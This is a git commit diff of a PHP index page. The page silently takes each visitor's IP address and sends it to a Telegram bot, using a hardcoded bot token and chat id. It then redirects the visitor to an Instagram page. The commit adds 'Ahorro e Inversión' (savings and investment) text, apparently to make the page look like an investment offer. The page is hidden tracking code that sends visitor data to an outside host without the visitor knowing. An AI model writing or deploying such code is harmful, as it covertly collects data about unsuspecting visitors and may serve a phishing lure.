efb6482d6029e08c35dc16e70861af864fca0a0a
Xavier Orejarena <xavierorejarena@Macintoshs-MacBook-Pro.local>
2023-02-09 08:16:49 -0400

    cedula

--- index.php
+++ index.php
@@ -1,9 +1,10 @@
 <?php
 $IP = $_SERVER['REMOTE_ADDR'];
 $token = '16396100:AAG_6y_pnkgYCKNRMyFVHow2eefR719DfCk';
-file_get_contents("https://api.telegram.org/bot7$token/sendMessage?chat_id=149273661&text=$IP"); 
+file_get_contents("https://api.telegram.org/bot7$token/sendMessage?chat_id=149273661&text=$IP");
 ?>
 
 <head>
     <meta http-equiv="refresh" content="3;url=https://www.instagram.com/apple" />
+    <a>Ahorro e Inversión</a>
 </head>
